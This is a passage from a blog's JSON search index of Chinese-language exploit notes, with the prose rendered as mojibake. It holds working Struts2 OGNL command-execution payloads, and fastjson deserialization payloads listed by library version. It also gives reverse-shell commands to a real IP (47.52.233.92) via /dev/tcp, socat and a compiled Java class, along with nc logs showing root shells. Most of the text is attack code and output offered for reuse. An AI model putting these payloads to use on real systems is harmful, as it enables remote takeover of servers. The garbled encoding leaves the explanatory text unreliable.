    "content"  : "s2-001struts2-001è¯¥æ¼æ´å› ä¸ºç”¨æˆ·æäº¤è¡¨å•æ•°æ®å¹¶ä¸”éªŒè¯å¤±è´¥æ—¶ï¼Œåç«¯ä¼šå°†ç”¨æˆ·ä¹‹å‰æäº¤çš„å‚æ•°å€¼ä½¿ç”¨OGNLè¡¨è¾¾å¼%{value}è¿›è¡Œè§£æï¼Œç„¶åé‡æ–°å¡«å……åˆ°å¯¹åº”çš„è¡¨å•æ•°æ®ä¸­ã€‚ä¾‹å¦‚æ³¨å†Œæˆ–ç™»å½•é¡µé¢ï¼Œæäº¤å¤±è´¥åç«¯ä¸€èˆ¬ä¼šé»˜è®¤è¿”å›ä¹‹å‰æäº¤çš„æ•°æ®ï¼Œç”±äºåç«¯ä½¿ç”¨%{value}å¯¹æäº¤çš„æ•°æ®æ‰§è¡Œäº†ä¸€æ¬¡OGNLè¡¨è¾¾å¼è§£æï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥æ„é€ Payloadè¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚å½±å“ç‰ˆæœ¬ï¼šStruts2.0.0-Struts2.0.8payloadä»£ç %25{#a=(newjava.lang.ProcessBuilder(newjava.lang.String[]{\"whoami\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=newjava.io.InputStreamReader(#b),#d=newjava.io.BufferedReader(#c),#e=newchar[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(newjava.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}å‘é€å›åŒ…å›æ˜¾å¦‚ä¸‹ï¼špayloadçš„æ³¨å…¥å‘½ä»¤whoamiä¸‹æ–¹é¡µé¢æ˜¾ç¤ºå›æ˜¾rootï¼Œæ‰§è¡ŒæˆåŠŸã€‚&lt;!DOCTYPEhtmlPUBLIC\"-//W3C//DTDHTML4.01Transitional//EN\"\"http://www.w3.org/TR/html4/loose.dtd\"&gt;&lt;html&gt;&lt;head&gt;&lt;metahttp-equiv=\"Content-Type\"content=\"text/html;charset=UTF-8\"&gt;&lt;title&gt;S2-001&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h2&gt;S2-001Demo&lt;/h2&gt;&lt;p&gt;link:&lt;ahref=\"https://struts.apache.org/docs/s2-001.html\"&gt;https://struts.apache.org/docs/s2-001.html&lt;/a&gt;&lt;/p&gt;\t\t\t&lt;formid=\"login\"name=\"login\"onsubmit=\"returntrue;\"action=\"/login.action\"method=\"post\"&gt;&lt;tableclass=\"wwFormTable\"&gt;\t&lt;tr&gt;&lt;tdclass=\"tdLabel\"&gt;&lt;labelfor=\"login_username\"class=\"label\"&gt;username:&lt;/label&gt;&lt;/td&gt;&lt;td&gt;&lt;inputtype=\"text\"name=\"username\"value=\"asdadas\"id=\"login_username\"/&gt;&lt;/td&gt;&lt;/tr&gt;rootpayload1:%25%7B%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%22whoami%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new+java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7Dpayload2(getshell):%25{#a=(newjava.lang.ProcessBuilder(newjava.lang.String[]{\"ping\",\"dnslog.cn\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=newjava.io.InputStreamReader(#b),#d=newjava.io.BufferedReader(#c),#e=newchar[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(newjava.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}%25{#a=(newjava.lang.ProcessBuilder(newjava.lang.String[]{\"/bin/bash\",\"-c\",\"/bin/bash-i&gt;&amp;/dev/tcp/47.52.233.92/123410&gt;&amp;1\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=newjava.io.InputStreamReader(#b),#d=newjava.io.BufferedReader(#c),#e=newchar[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(newjava.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}--------------------+--------------------+ä»¥ä¸‹æ˜¯ä½¿ç”¨payloadï¼Œå®æµ‹èƒ½å¤Ÿååˆ†æœ‰æ•ˆçš„è¿›è¡Œå„ç§pocä»£ç æ³¨å…¥ï¼Œä½¿ç”¨urlç¼–ç æ•ˆæœæ›´ä½³ã€‚%25{#a=(newjava.lang.ProcessBuilder(newjava.lang.String[]{\"/bin/bash\",\"-c\",\"/bin/bash-i&gt;&amp;/dev/tcp/47.52.233.92/123410&gt;&amp;1\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=newjava.io.InputStreamReader(#b),#d=newjava.io.BufferedReader(#c),#e=newchar[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(newjava.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}nc-lvnp12341Listeningon0.0.0.012341Connectionreceivedon120.242.209.22417321bash:cannotsetterminalprocessgroup(1):Inappropriateioctlfordevicebash:nojobcontrolinthisshellroot@9485ca31e963:/usr/local/tomcat#iduid=0(root)gid=0(root)groups=0(root)s2-013?url=%24%7B%28%23_memberAccess%5B\"allowStaticMethodAccess\"%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read%28%23d%29%2C%23out%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23out.println%28%23d%29%2C%23out.close%28%29%29%7Dstruts2-dev-modedebug=command&amp;expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23a%3d@java.lang.Runtime@getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2c%23b%3dnewjava.io.InputStreamReader%28%23a%29%2c%23c%3dnewjava.io.BufferedReader%28%23b%29%2c%23d%3dnewchar%5b50000%5d%2c%23c.read%28%23d%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%23d%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29s2-057å½±å“ç‰ˆæœ¬:&lt;=Struts2.3.34,Struts2.5.16è®¿é—®http://localhost:8080/${(111+111)}/actionChain1.actionRequståŒ…GET/$%7B(111+111)%7D/actionChain1.actionHTTP/1.1Host:vuln_s2_ip:8080DNT:1Upgrade-Insecure-Requests:1User-Agent:Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/83.0.4103.61Safari/537.36Edg/83.0.478.37Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding:gzip,deflateAccept-Language:zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie:JSESSIONID=6567848243F5C10BA42DA6C8222FFC32Connection:close+------------------------++------------------------++------------------------++------------------------++------------------------++------------------------+ResponseåŒ…ï¼šHTTP/1.1302Location:/222/register2.actionContent-Length:0Date:Wed,27May202006:21:06GMTConnection:closeæˆ‘ä»¬çœ‹åˆ°${(111+111)}è¡¨è¾¾å¼å·²ç»è¢«è®¡ç®—"
  },

  {
    "title"    : "ã€ŒBASHã€:è°ˆè°ˆå®Œå…¨äº¤äº’å¼çš„ç»ˆç«¯",
    "category" : "",
    "tags"     : "BASH, ç¬”è®°",
    "url"      : "/blog/2020/get/TTY/terminal/",
    "date"     : "May 20, 2020",
    "content"  : "å†™åœ¨å‰é¢ï¼Œæœ¬æ–¹æ³•é€‚ç”¨äºåœ¨åå¼¹shellåæŠŠshellæå‡ä¸ºå®Œå…¨äº¤äº’å¼shellï¼Œä¹Ÿæ˜¯è‡ªå·±å®æˆ˜äº†ä¸€æ®µæ—¶é—´åæ‘¸ç´¢å‡ºæ¥çš„ï¼Œè®°ä¸€ä¸‹ç¬”è®°å®Œç¾çš„äº¤äº’å¼shellpython$python-c\"importpty;pty.spawn('/bin/bash')\"#è¾“å…¥Ctrl+Z$sttyraw-echo$fg$reset$exportSHELL=bash#orexportTERM=xterm-256colorsrciptbasedonbashåŒæ ·çš„ï¼Œæˆ‘åœ¨ç½‘ä¸Šä¹Ÿæ‰¾åˆ°å¦å¤–ä¸€ç§æ–¹å¼ï¼šscript/dev/null/è¿™æ ·ï¼šåŒç†ï¼Œä¹Ÿå¯ä»¥é€šè¿‡åŒæ ·çš„æ–¹å¼è·å–åˆ°äº¤äº’å¼shellï¼šscript/dev/nullCtrl-Zsttyraw-echofgresetè¿™æ ·æˆ‘ä»¬åœ¨ç»ˆç«¯æŸä¸ªå‘½ä»¤æ—¶ï¼Œè¾“å…¥ctrl+cæˆ–è€…ctrl+zå°±ä¸ä¼šç›´æ¥ä¸­æ–­shellã€‚è¿™é‡Œè½¬è½½æœåˆ°ä¿¡æ¯æ¥è¿›è¡Œå±•ç¤ºï¼Œä¾›å¤§å®¶å‚è€ƒï¼šstty-echo\t#ç¦æ­¢å›æ˜¾ï¼Œå½“åœ¨é”®ç›˜ä¸Šè¾“å…¥æ—¶ï¼Œå¹¶ä¸å‡ºç°åœ¨å±å¹•ä¸Šsttyecho\t#æ‰“å¼€å›æ˜¾sttyraw\t#è®¾ç½®åŸå§‹è¾“å…¥stty-raw\t#å…³é—­åŸå§‹è¾“å…¥bg\t\t\t#å°†ä¸€ä¸ªåœ¨åå°æš‚åœçš„å‘½ä»¤ï¼Œå˜æˆç»§ç»­æ‰§è¡Œfg\t\t\t#å°†åå°ä¸­çš„å‘½ä»¤è°ƒè‡³å‰å°ç»§ç»­è¿è¡Œjobs\t\t#æŸ¥çœ‹å½“å‰æœ‰å¤šå°‘åœ¨åå°è¿è¡Œçš„å‘½ä»¤ctrl+z\t\t#å¯ä»¥å°†ä¸€ä¸ªæ­£åœ¨å‰å°æ‰§è¡Œçš„å‘½ä»¤æ”¾åˆ°åå°ï¼Œå¹¶ä¸”æš‚åœclear\t\t#è¿™ä¸ªå‘½ä»¤å°†ä¼šåˆ·æ–°å±å¹•ï¼Œæœ¬è´¨ä¸Šåªæ˜¯è®©ç»ˆç«¯æ˜¾ç¤ºé¡µå‘åç¿»äº†ä¸€é¡µï¼Œå¦‚æœå‘ä¸Šæ»šåŠ¨å±å¹•è¿˜å¯ä»¥çœ‹åˆ°ä¹‹å‰çš„æ“ä½œä¿¡æ¯ã€‚reset\t\t#è¿™ä¸ªå‘½ä»¤å°†å®Œå…¨åˆ·æ–°ç»ˆç«¯å±å¹•ï¼Œä¹‹å‰çš„ç»ˆç«¯è¾“å…¥æ“ä½œä¿¡æ¯å°†éƒ½ä¼šè¢«æ¸…ç©ºæ¥æºï¼šå®ç°äº¤äº’å¼shellçš„å‡ ç§æ–¹å¼socatç›®æ ‡æœºæŠŠsocatä¸Šä¼ åˆ°ç›®æ ‡æœºå™¨ä¸Šæˆ–è€…ç›´æ¥ä¸‹è½½$wgethttps://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat-O/tmp/socatvuln_ip:chmod+x/tmp/socat./tmp/socatexec:'bash-li',pty,stderr,setsid,sigint,sanetcp:47.52.233.92:4444--attackmachinesocatfile:`tty`,raw,echo=0tcp-listen:4444sttyè¡Œåˆ—æ•°:)æœ‰çš„æ—¶å€™ç»ˆç«¯å†™å…¥çš„å‘½ä»¤å¤ªé•¿ï¼Œè€Œç»ˆç«¯è¡Œåˆ—ä¸å¤Ÿé•¿æ¥æ˜¾ç¤ºæ‰€ä»¥ä¼šå¯¼è‡´å‘½ä»¤é‡å ã€é”™æ‚ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä¸‹é¢çš„æ–¹æ³•æ¥è®©æˆ‘ä»¬ç”¨è¿™ä¸ªshellç”¨çš„æ›´èˆ’æœç‚¹ï¼›å…ˆçœ‹çœ‹è‡ªå·±æœºå™¨ä¸Šçš„sttyé…ç½®ä¿¡æ¯:root@ubuntu20-free:~#stty-aspeed9600baud;rows35;columns148;line=0;intr=^C;quit=^\\;erase=^?;kill=^U;eof=^D;eol=&lt;undef&gt;;eol2=&lt;undef&gt;;swtch=&lt;undef&gt;;start=^Q;stop=^S;susp=^Z;rprnt=^R;werase=^W;lnext=^V;discard=^O;min=1;time=0;-parenb-parodd-cmsparcs8-hupcl-cstopbcread-clocal-crtscts-ignbrk-brkint-ignpar-parmrk-inpck-istrip-inlcr-igncricrnlixon-ixoff-iuclc-ixany-imaxbel-iutf8opost-olcuc-ocrnlonlcr-onocr-onlret-ofill-ofdelnl0cr0tab0bs0vt0ff0isigicanoniextenechoechoeechok-echonl-noflsh-xcase-tostop-echoprtechoctlechoke-flusho-extprocspeed9600baud;rows35;columns148;line=0;è¿™ä¸€æ®µæ˜¯æˆ‘ä»¬æ‰€éœ€è¦çš„ä¿¡æ¯ï¼›rows35;columns148é…ç½®æˆ‘ä»¬çš„shellå¦‚ä¸‹ï¼š$sttyrows35cols148å…¶ä»–ç—›ç‚¹æœ‰çš„æ—¶å€™æ„Ÿè§‰terminalä¸Šå¤ªå¤šå‘½ä»¤äº†ï¼Œç”¨ç€ç”¨ç€ä¼šä¹ æƒ¯æ€§è¾“å…¥å‘½ä»¤clearï¼Œç„¶åä½ ä»¬å°±ä¼šçœ‹åˆ°å¦‚ä¸‹ç°è±¡ï¼š#clearTERMenvironmentvariablenotset.#set|grepTERMTERM=dumbå¦‚ä¸Šï¼Œçœ‹termçš„é…ç½®ä¿¡æ¯ï¼Œæœ€åè§£å†³åŠæ³•å¦‚ä¸‹ï¼Œè®¾ç½®termä¸ºxtermå°±å¯ä»¥äº†ã€‚#exportTERM=xterm#set|grepTERMTERM=xterm_=TERMä¹‹åå°±å¯ä»¥éšæ„çš„clearæ¸…é™¤å‘½ä»¤è¾£ï¼"
  },

  {
    "title"    : "ã€Œfastjsonã€:æµ…è°ˆjsonçš„ååºåˆ—åŒ–",
    "category" : "",
    "tags"     : "æ¼æ´å¤ç°, ç¬”è®°, vulnhub, Sql-Inject",
    "url"      : "/blog/2020/fastjson/UNdeser/",
    "date"     : "May 19, 2020",
    "content"  : "fastjsonæŒ‡çº¹ç‰¹å¾è®¿é—®é¡µé¢ï¼ŒæŸ¥çœ‹ååŒ…æ˜¯ä¸€ä¸ªæŒ‡å®šçš„jsonæ ¼å¼çš„æ•°æ®ã€‚è¯·æ±‚åŒ…ï¼šGET/HTTP/1.1Host:underattack-host:8090Cache-Control:max-age=0DNT:1Upgrade-Insecure-Requests:1User-Agent:Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/81.0.4044.138Safari/537.36Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding:gzip,deflateAccept-Language:zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Connection:closeååŒ…ï¼šHTTP/1.1200Content-Type:application/json;charset=UTF-8Content-Length:28Date:Tue,19May202001:05:29GMTConnection:close{\"age\":25,\"name\":\"Bob\"}å¦‚ä¸Šçš„è¯·æ±‚å’ŒååŒ…ã€‚æˆ‘ä»¬çŸ¥é“äº†jsonçš„æ ¼å¼ç›´æ¥æ„é€ å‚æ•°ï¼Œç»™æœåŠ¡å™¨å‘åŒ…çœ‹çœ‹ï¼šPOST/HTTP/1.1Host:underattack-host:8090Cache-Control:max-age=0DNT:1Upgrade-Insecure-Requests:1Content-Type:application/jsonUser-Agent:Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/81.0.4044.138Safari/537.36Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding:gzip,deflateAccept-Language:zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Connection:closeContent-Length:26{\"name\":\"hello\",\"age\":20}ååŒ…ï¼šHTTP/1.1200Content-Type:application/json;charset=UTF-8Content-Length:30Date:Tue,19May202001:06:20GMTConnection:close{\"age\":20,\"name\":\"hello\"}æˆ‘ä»¬çœ‹åˆ°æœåŠ¡å™¨ç«¯è¿”å›åŒ…ä¸ºæˆ‘ä»¬æ„é€ çš„åŒ…ã€‚fastjson1.2.24ååºåˆ—åŒ–å¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´fastjsonåœ¨è§£æjsonçš„è¿‡ç¨‹ä¸­ï¼Œæ”¯æŒä½¿ç”¨autoTypeæ¥å®ä¾‹åŒ–æŸä¸€ä¸ªå…·ä½“çš„ç±»ï¼Œå¹¶è°ƒç”¨è¯¥ç±»çš„set/getæ–¹æ³•æ¥è®¿é—®å±æ€§ã€‚é€šè¿‡æŸ¥æ‰¾ä»£ç ä¸­ç›¸å…³çš„æ–¹æ³•ï¼Œå³å¯æ„é€ å‡ºä¸€äº›æ¶æ„åˆ©ç”¨é“¾ã€‚å‚è€ƒèµ„æ–™ï¼šæµ…è°ˆFastjsonRCEæ¼æ´çš„ç»•è¿‡å²fastjsonè¿œç¨‹ååºåˆ—åŒ–pocçš„æ„é€ å’Œåˆ†æé¦–å…ˆç¼–è¯‘å¹¶ä¸Šä¼ å‘½ä»¤æ‰§è¡Œä»£ç ##catdnslog.javaimportjava.lang.Runtime;importjava.lang.Process;publicclassdnslog{static{try{Runtimert=Runtime.getRuntime();String[]commands={\"/bin/sh\",\"-c\",\"pinguser.`whoami`.c08aqu.dnslog.cn\"};Processpc=rt.exec(commands);pc.waitFor();}catch(Exceptione){//donothing}}}ç¼–è¯‘ï¼šjavacdnslog.javaã€‚ç”Ÿæˆclassæ–‡ä»¶ï¼›ç„¶åæˆ‘ä»¬å€ŸåŠ©marshalsecé¡¹ç›®ï¼Œå¯åŠ¨ä¸€ä¸ªRMIæœåŠ¡å™¨ï¼Œç›‘å¬9999ç«¯å£ï¼Œå¹¶æŒ‡å®šå—å®³æœºå™¨è®¿é—®9999ç«¯å£åï¼Œå»åŠ è½½è¿œç¨‹æœåŠ¡å™¨çš„ç±»dnslog.classï¼Œè€Œclassæ–‡ä»¶å°±æ˜¯æ‰§è¡Œcommandã€‚gitclonehttps://github.com/mbechler/marshalsec.gitcdmarshalsecmvncleanpackage-DskipTests##çœ‹åˆ°BUILDSUCCESSåè¿›å…¥targetcdtargetjava-cpmarshalsec-0.0.3-SNAPSHOT-all.jarmarshalsec.jndi.RMIRefServer\"https://www.chihou.pro/##dnslog\"9999*OpeningJRMPlisteneron9999å¼€å¯ç›‘å¬ã€‚å‘é¶åœºæœåŠ¡å™¨å‘é€Payloadï¼Œå¸¦ä¸ŠRMIçš„åœ°å€ï¼š##POSTæ•°æ®{\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://47.52.233.92:9999/dnslog\",\"autoCommit\":true}}##è¿”å›{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://47.52.233.92:9999/expUseful\",\"autoCommit\":true}}å‘é€å®Œæ¯•åæ£€æŸ¥RMIæœåŠ¡å™¨çš„ç›‘å¬è®°å½•ï¼š*OpeningJRMPlisteneron9999Haveconnectionfrom/61.133.171.114:11430Readingmessage...IsRMI.lookupcallfordnslog2Sendingremoteclassloadingstubtargetinghttps://www.chihou.pro/dnslog.classClosingconnectionå—å®³æœºå™¨å·²ç»è®¿é—®äº†æˆ‘ä»¬çš„æœåŠ¡å™¨ï¼Œæœ€åæ£€æŸ¥æ˜¯å¦æ‰§è¡Œdnslogå‘½ä»¤ï¼›user.root.c08aqu.dnslog.cn61.132.161.122020-08-1415:43:30user.root.c08aqu.dnslog.cn61.132.161.52020-08-1415:43:30user.root.c08aqu.dnslog.cn61.132.161.122020-08-1415:43:30user.root.c08aqu.dnslog.cn61.132.161.52020-08-1415:43:30å¯è§ï¼Œpingå‘½ä»¤å·²æˆåŠŸæ‰§è¡Œ;åå¼¹shellåŒæ ·çš„ï¼Œç›´æ¥åœ¨pocä»£ç é‡Œä¿®æ”¹åå¼¹shellçš„ä»£ç å³å¯ã€‚importjava.lang.Runtime;importjava.lang.Process;publicclassnc{static{try{Runtimert=Runtime.getRuntime();String[]commands={\"/bin/bash\",\"-c\",\"bash-i&gt;&amp;/dev/tcp/47.52.233.92/123410&gt;&amp;1\"};Processpc=rt.exec(commands);pc.waitFor();}catch(Exceptione){//no}}}åŒç†å³å¯è·å¾—åå¼¹shellï¼š##nc-lvnp12341Listeningon0.0.0.012341Connectionreceivedon120.242.209.703450bash:cannotsetterminalprocessgroup(1):Inappropriateioctlfordevicebash:nojobcontrolinthisshellroot@5a8812147218:/##whoamiwhoamirootdnslogpayload{\"rand1\":{\"@type\":\"java.net.InetAddress\",\"val\":\"http://dnslog\"}}{\"rand2\":{\"@type\":\"java.net.Inet4Address\",\"val\":\"http://dnslog\"}}{\"rand3\":{\"@type\":\"java.net.Inet6Address\",\"val\":\"http://dnslog\"}}{\"rand4\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"http://dnslog\"}}}{\"rand5\":{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog\"}}##ä¸€äº›ç•¸å½¢payloadï¼Œä¸è¿‡ä¾ç„¶å¯ä»¥è§¦å‘dnslogï¼š{\"rand6\":{\"@type\":\"com.alibaba.fastjson.JSONObject\",{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog\"}}\"\"}}{\"@type\":\"java.lang.AutoCloseable\"{\"rand7\":Set\\[{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog\"}\\]}{\"rand8\":Set\\[{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog\"}{\"rand9\":{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog\"}{\"@type\":\"java.lang.AutoCloseable\"{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://47.52.233.92:9999/expUseful\",\"autoCommit\":true}}{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://47.52.233.92:9999/expUseful\",\"autoCommit\":true}ä¸€äº›å…¶ä»–ç‰ˆæœ¬çš„payload1.2.41##ç›´æ¥åŠ [æ˜¯ä¸å¯ä»¥çš„ï¼Œå› ä¸ºæ•°ç»„å®ä¾‹åŒ–çš„æ˜¯Objectç±»å‹ï¼Œæ‰€ä»¥éœ€è¦å°†ä¼ å…¥çš„å˜é‡è®¾ç½®ä¸ºæ•°ç»„æ ¼å¼ï¼Œç„¶ååœ¨##com.alibaba.fastjson.serializer.ObjectArrayCodecä¸­é€šè¿‡æ•°ç»„å¯¹è±¡çš„getComponentType()##å¯ä»¥è·å¾—æ•°ç»„å…ƒç´ å³com.sun.rowset.JdbcRowSetImplå¯¹è±¡{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://47.52.233.92:9999/expUseful\",\"autoCommit\":true}{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{\"dataSourceName\":\"ldap://47.52.233.92:9999/expUseful\",\"autoCommit\":true]}1.2.42{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"ldap://47.52.233.92:9999/expUseful\",\"autoCommit\":true}//åŸæ¥åœ¨41ç‰ˆæœ¬çš„[è¿˜èƒ½ç”¨{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{\"dataSourceName\":\"ldap://47.52.233.92:9999/expUseful\",\"autoCommit\":true]}1.2.43{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"ldap://47.52.233.92:9999/expUseful\"}}1.2.45{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"ldap://47.52.233.92:9999/expUseful\"}}1.2.47{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://47.52.233.92:9999/expUseful\",\"autoCommit\":true}}}{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://47.52.233.92:9999/expUseful\",\"autoCommit\":true}}}1.2.60{\"@type\":\"org.apache.commons.configuration.JNDIConfiguration\",\"prefix\":\"ldap://47.52.233.92:9999/expUseful\"}{\"@type\":\"oracle.jdbc.connector.OracleManagedConnectionFactory\",\"xaDataSourceName\":\"ldap://47.52.233.92:9999/expUseful\"}{\\\"@type\\\":\\\"oracle.jdbc.connector.OracleManagedConnectionFactory\\\",\\\"xaDataSourceName\\\":\\\"rmi://10.10.20.166:1099/ExportObject\\\"}{\\\"@type\\\":\\\"org.apache.commons.configuration.JNDIConfiguration\\\",\\\"prefix\\\":\\\"ldap://10.10.20.166:1389/ExportObject\\\"}{\\\"@type\\\":\\\"org.apache.commons.configuration2.JNDIConfiguration\\\",\\\"prefix\\\":\\\"rmi://127.0.0.1:1099/Exploit\\\"}\"1.2.62{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"rmi://127.0.0.1:1099/exploit\"}1.2.66{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://47.52.233.92:9999/expUseful\"}{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"ldap://47.52.233.92:9999/expUseful\"}{\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\",\"jndiNames\":\"ldap://47.52.233.92:9999/expUseful\"}{\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\":{\"@type\":\"java.util.Properties\",\"UserTransaction\":\"ldap://47.52.233.92:9999/expUseful\"}}RMI{\"@type\":\"LLcom.sun.rowset.RowSetImpl;;\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true}1.2.42{\"@type\":\"[com.sun.rowset.RowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true}1.2.25v1.2.43{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\"ï¼š\"data_source\":\"rmi://localhost:1099/Exploit\"}}1.2.25{\"@type\":\"Lcom.sun.rowset.RowSetImpl;\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true}{\\\"@type\\\":\\\"com.zaxxer.hikari.HikariConfig\\\",\\\"metricRegistry\\\":\\\"rmi://127.0.0.1:1099/Exploit\\\"}1.2.60{\\\"@type\\\":\\\"org.apache.commons.configuration.JNDIConfiguration\\\",\\\"prefix\\\":\\\"rmi://127.0.0.1:1099/Exploit\\\"}1.2.60{\\\"@type\\\":\\\"org.apache.commons.configuration2.JNDIConfiguration\\\",\\\"prefix\\\":\\\"rmi://127.0.0.1:1099/Exploit\\\"}1.2.61{\\\"@type\\\":\\\"org.apache.xbean.propertyeditor.JndiConverter\\\",\\\"asText\\\":\\\"rmi://localhost:1099/Exploit\\\"}1.2.62{\\\"@type\\\":\\\"br.com.anteros.dbcp.AnterosDBCPConfig\\\",\\\"healthCheckRegistry\\\":\\\"rmi://localhost:1099/Exploit\\\"}AnterosDBCPConfig{\\\"@type\\\":\\\"br.com.anteros.dbcp.AnterosDBCPConfig\\\",\\\"metricRegistry\\\":\\\"rmi://localhost:1099/Exploit\\\"}AnterosDBCPConfig{\\\"@type\\\":\\\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\\\",\\\"properties\\\":{\\\"UserTransaction\\\":\\\"rmi://localhost:1099/Exploit\\\"}}JtaTransactionConfig"
  },

  {
    "title"    : "ShiroDeser",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/ShiroDeser/",
    "date"     : "May 18, 2020",
